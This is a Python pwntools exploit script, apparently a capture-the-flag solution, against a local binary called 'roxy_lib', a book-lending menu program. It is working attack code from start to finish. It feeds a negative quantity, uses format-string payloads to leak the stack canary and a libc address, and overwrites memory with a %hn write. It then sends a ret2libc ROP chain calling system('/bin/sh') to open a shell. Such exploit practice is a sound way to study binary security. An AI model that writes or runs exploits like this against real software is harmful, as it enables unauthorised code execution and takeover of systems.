from pwn import *
context(log_level='debug', arch='amd64', os='linux')
io = process("./roxy_lib")
io.recvuntil(b"5. exit")
io.sendline(b"1") 
io.recvuntil(b"u want to buy")
io.sendline(b"Mushoku Tensei: Isekai Ittara Honki Dasu") 
io.recvuntil(b"how many")
io.sendline(b"-9000000") 
io.recvuntil(b"5. exit")
io.sendline(b"4") 
io.recvuntil(b"how many bytes do u want to leave")
fmt1 = b'%7$p|%11$p|'
content = b"a" * 0x60 + fmt1
io.sendline(str(len(content)).encode())
io.recvuntil(b"leave your message")
io.send(content)
io.recvuntil(b"5. exit")
io.sendline(b"2")
io.recvuntil(b"ow many book do u want to borrow?")
io.sendline(b"0")
io.recvuntil(b"================book list================\n")
leak_data = io.recvuntil(b": Romeo", drop=True)
leaks = leak_data.split(b'|')
canary = int(leaks[0], 16)
libc_leak = int(leaks[1], 16)
log.success(f"Canary: {hex(canary)}")
log.success(f"Libc Leak: {hex(libc_leak)}")
libc = ELF("./libc.so.6")
stdout_add = libc.sym['_IO_2_1_stdout_']
libc_base = libc_leak - stdout_add
log.success(f'libc_base:{hex(libc_base)}')
libc.address = libc_base
system_addr = libc.sym["system"]
binsh_addr = next(libc.search(b"/bin/sh"))
prdi = libc_base + 0x10f78b
ret = libc_base + 0x2882f
log.success(f"system:{hex(system_addr)}")
io.recvuntil(b"5. exit")
io.sendline(b"4") 
io.recvuntil(b"how many bytes do u want to leave")
fmt2 = b'%3c%14$hn'
content = b"a" * 0x60 + fmt2
io.sendline(str(len(content)).encode())
io.recvuntil(b"leave your message")
io.send(content)
io.recvuntil(b"5. exit")
io.sendline(b"2") 
io.recvuntil(b"ow many book do u want to borrow?")
io.sendline(b"1")
io.recvuntil(b"input the book name")
payload = flat([
    'A' * 0x18,
     canary,
     'A' * 8,
     ret,
     prdi,
     binsh_addr,
     system_addr
])
io.send(payload) 
io.interactive()